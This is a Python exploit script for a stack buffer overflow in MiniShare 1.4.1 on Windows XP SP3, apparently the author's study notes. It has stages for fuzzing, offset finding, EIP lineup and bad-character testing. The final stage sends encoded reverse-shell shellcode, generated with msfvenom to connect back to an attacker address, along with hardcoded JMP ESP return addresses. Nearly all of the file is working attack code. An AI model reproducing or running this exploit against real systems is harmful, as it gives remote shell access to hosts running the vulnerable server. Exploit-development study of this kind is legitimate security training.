#!/usr/bin/python
#
# Exploit MiniShare 1.4.1
# My Notes on exploiting MiniShare 1.4.1
# Tested on Windows XP SP3 English / French
# aka0 2020
#
import socket
import argparse
import sys

SUPPORTED_ACTIONS = ['fuzz', 'offset', 'lineup', 'badchar', 'exploit']
MAX_LENGTH = 65535
FUZZ_INCREMENT = 100


def main():
    parser = argparse.ArgumentParser(description='Exploit MiniShare 1.4.1')
    parser.add_argument('--host', type=str, help='Target hostname')
    parser.add_argument(
        '--port', type=int, default=123, help='Target port. DEFAULT=123')
    parser.add_argument(
        '--action',
        type=str,
        help='Exploit stage - {}'.format(str(SUPPORTED_ACTIONS)))
    args = parser.parse_args()

    if args.host is None:
        print('You must specify a hostname!')
        sys.exit(-1)

    if args.action is None or args.action.lower() not in SUPPORTED_ACTIONS:
        print('You must specify an action!')
        sys.exit(-1)

    if args.action == 'fuzz':
        fuzz(args.host, args.port)

    if args.action == 'offset':
        offset(args.host, args.port)

    if args.action == 'lineup':
        lineup(args.host, args.port)

    if args.action == 'badchar':
        badchar(args.host, args.port)

    if args.action == 'exploit':
        exploit(args.host, args.port)


def fuzz(host, port):
    print('Fuzzing {}:{}'.format(host, port))

    payload = 'A'
    for i in range(MAX_LENGTH):
        length = i * FUZZ_INCREMENT
        print('Sending {} of {}'.format(str(length), payload))
        send(host, port, payload * length)


def offset(host, port):
    print('Find offset {}:{}'.format(host, port))
    print(
        'Generate a unique string using /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH found during fuzzing'
    )

    pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'

    send(host, port, pattern)

    print(
        'Run /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q ADDRESS for EIP/ESP'
    )


def lineup(host, port):
    print('Injecting chars to make sure addresses lineup in the debugger')
    payload = 'A' * 1787 + 'B' * 4 + 'C' * (1800 - 1787 - 4)
    send(host, port, payload)
    print(
        'Payload sent, check debugger. EIP should be 42424242, ESP dump should contain all Cs (HEX:43)'
    )
    print('Find JMP ESP (FFE4) address to use for EIP')
    print('Use !mona module to locate a module in memory with JMP ESP')
    print('!mona find -s "\xff\xe4" -m MODULE')


def badchar(host, port):
    print('Send chars')

    bad_chars = ""
    bad_chars += "x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10"
    bad_chars += "x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1fx20"
    bad_chars += "x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30"
    bad_chars += "x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40"
    bad_chars += "x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50"
    bad_chars += "x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5fx60"
    bad_chars += "x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70"
    bad_chars += "x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7fx80"
    bad_chars += "x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90"
    bad_chars += "x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9fxa0"
    bad_chars += "xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0"
    bad_chars += "xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbfxc0"
    bad_chars += "xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0"
    bad_chars += "xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0"
    bad_chars += "xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
    bad_chars += "xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"

    payload = 'A' * 1787 + 'B' * 4 + bad_chars + 'C' * (1800 - 1787 - 4 - 255)

    send(host, port, payload)

    print('Check debugger for missing chars')


def exploit(host, port):
    print('Sending shellcode')

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.128 LPORT=1314 EXITFUNC=thread -b"\x00\x0d\x0a" -f py -a x86 --platform windows -e x86/shikata_ga_nai -n 16 -v shellcode
    # Found 1 compatible encoders
    # Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    # x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    # x86/shikata_ga_nai chosen with final size 351
    # Successfully added NOP sled from x86/single_byte
    # Payload size: 367 bytes

    shellcode = ""
    shellcode += "\x49\x40\x48\x90\xf9\x27\xf5\x43\x92\xfd\x99\x48"
    shellcode += "\x48\x98\xf5\x90\xba\x8a\xac\x13\x7c\xdb\xc7\xd9"
    shellcode += "\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x53\x12\x03"
    shellcode += "\x53\x12\x83\x49\xa8\xf1\x89\xb1\x59\x77\x71\x49"
    shellcode += "\x9a\x18\xfb\xac\xab\x18\x9f\xa5\x9c\xa8\xeb\xeb"
    shellcode += "\x10\x42\xb9\x1f\xa2\x26\x16\x10\x03\x8c\x40\x1f"
    shellcode += "\x94\xbd\xb1\x3e\x16\xbc\xe5\xe0\x27\x0f\xf8\xe1"
    shellcode += "\x60\x72\xf1\xb3\x39\xf8\xa4\x23\x4d\xb4\x74\xc8"
    shellcode += "\x1d\x58\xfd\x2d\xd5\x5b\x2c\xe0\x6d\x02\xee\x03"
    shellcode += "\xa1\x3e\xa7\x1b\xa6\x7b\x71\x90\x1c\xf7\x80\x70"
    shellcode += "\x6d\xf8\x2f\xbd\x41\x0b\x31\xfa\x66\xf4\x44\xf2"
    shellcode += "\x94\x89\x5e\xc1\xe7\x55\xea\xd1\x40\x1d\x4c\x3d"
    shellcode += "\x70\xf2\x0b\xb6\x7e\xbf\x58\x90\x62\x3e\x8c\xab"
    shellcode += "\x9f\xcb\x33\x7b\x16\x8f\x17\x5f\x72\x4b\x39\xc6"
    shellcode += "\xde\x3a\x46\x18\x81\xe3\xe2\x53\x2c\xf7\x9e\x3e"
    shellcode += "\x39\x34\x93\xc0\xb9\x52\xa4\xb3\x8b\xfd\x1e\x5b"
    shellcode += "\xa0\x76\xb9\x9c\xc7\xac\x7d\x32\x36\x4f\x7e\x1b"
    shellcode += "\xfd\x1b\x2e\x33\xd4\x23\xa5\xc3\xd9\xf1\x6a\x93"
    shellcode += "\x75\xaa\xca\x43\x36\x1a\xa3\x89\xb9\x45\xd3\xb2"
    shellcode += "\x13\xee\x7e\x49\xf4\x1b\x74\x51\x5e\x74\x88\x51"
    shellcode += "\x5b\xa6\x05\xb7\x09\xb6\x43\x60\xa6\x2f\xce\xfa"
    shellcode += "\x57\xaf\xc4\x87\x58\x3b\xeb\x78\x16\xcc\x86\x6a"
    shellcode += "\xcf\x3c\xdd\xd0\x46\x42\xcb\x7c\x04\xd1\x90\x7c"
    shellcode += "\x43\xca\x0e\x2b\x04\x3c\x47\xb9\xb8\x67\xf1\xdf"
    shellcode += "\x40\xf1\x3a\x5b\x9f\xc2\xc5\x62\x52\x7e\xe2\x74"
    shellcode += "\xaa\x7f\xae\x20\x62\xd6\x78\x9e\xc4\x80\xca\x48"
    shellcode += "\x9f\x7f\x85\x1c\x66\x4c\x16\x5a\x67\x99\xe0\x82"
    shellcode += "\xd6\x74\xb5\xbd\xd7\x10\x31\xc6\x05\x81\xbe\x1d"
    shellcode += "\x8e\xa1\x5c\xb7\xfb\x49\xf9\x52\x46\x14\xfa\x89"
    shellcode += "\x85\x21\x79\x3b\x76\xd6\x61\x4e\x73\x92\x25\xa3"
    shellcode += "\x09\x8b\xc3\xc3\xbe\xac\xc1"

    # user32.dll from XP SP3 English (test machine)
    ret_addr1 = '\x53\x93\x42\x7e'

    # JMP ESP XP SP3 French (check XP version under C:\windows\system32\eula.txt)
    # Found the following address from metasploit module
    # ['Windows XP SP3 French', { 'Rets' => [ 1787, 0x7e3a9353 ]}], # jmp esp
    ret_addr2 = '\x53\x93\x3a\x7e'
    payload = 'A' * 1787 + ret_addr2 + shellcode + 'C' * 255

    send(host, port, payload)


def send(host, port, payload):

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, port))
        exploit = 'GET '
        exploit += payload
        exploit += ' HTTP/1.1\r\n\r\n'
        s.send(exploit)
        s.recv(1024)
    except Exception as e:
        print(str(e))
        sys.exit(-1)


if __name__ == '__main__':
    main()
